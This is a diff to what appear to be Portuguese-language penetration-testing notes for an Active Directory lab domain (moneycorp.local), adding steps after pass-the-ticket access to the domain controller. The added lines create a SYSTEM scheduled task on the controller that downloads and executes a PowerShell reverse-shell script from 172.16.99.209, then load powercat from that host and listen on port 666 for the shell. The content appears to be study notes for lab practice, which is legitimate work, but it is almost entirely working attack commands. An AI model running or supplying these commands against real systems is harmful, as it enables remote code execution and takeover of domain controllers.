@@ -3170,4 +3170,13 @@ kerberos::ptt c:\krbtgt_tkt.kirbi
 dir \\mcorp-dc.moneycorp.local\c$
 Get-WmiObject -class win32_operatingsystem -computername mcorp-dc.moneycorp.local
 ```
-	
+4. CRIAR UMA TAREFA PARA CRIAR UM SHELL REVERSO USANDO POWERCAT.
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "DOWNLOAD" /TR "powershell.exe -c 'IEX(New-Object System.Net.WebClient).DownloadString(''http://172.16.99.209/oscp/Invoke-PowerShellTcp2.ps1''')'"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "DOWNLOAD"
+```
+5. AGUARDAR A CONEXÃO DO SHELL REVERSO
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/powercat.ps1")
+powercat -l -p 666 -v
+```
